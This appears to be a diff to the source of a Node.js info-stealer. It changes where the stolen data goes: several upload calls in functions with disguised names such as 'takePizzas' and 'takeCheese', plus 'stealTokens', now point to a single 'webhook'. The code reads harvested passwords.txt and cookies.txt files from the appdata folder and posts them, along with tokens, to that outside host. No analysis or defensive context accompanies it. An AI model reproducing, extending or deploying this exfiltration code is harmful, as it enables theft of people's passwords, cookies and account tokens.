@@ -359,7 +359,7 @@ async function takePizzas() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
-        form.submit(superstarlmao, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -369,7 +369,7 @@ async function takePizzas() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
-        form.submit(src, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -387,7 +387,7 @@ async function takeCheese() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\cookies.txt"));
-        form.submit(superstarlmao, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -398,7 +398,7 @@ async function takeCheese() {
       
         const form = new FormData();
         form.append("file", fs.createReadStream(appdata+"\\src-cookies.txt"));
-        form.submit(src, (error, response) => {
+        form.submit(webhook, (error, response) => {
         if (error) console.log(error);
         });
     });
@@ -419,7 +419,7 @@ async function stealTokens() {
         });
     }
 
-    axios.post(superstarlmao, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
@@ -435,7 +435,7 @@ async function stealTokens() {
         }]
     }) .then(res => {}).catch(error => {})
 
-    axios.post(src, {
+    axios.post(webhook, {
         "content": null,
         "embeds": [
           {
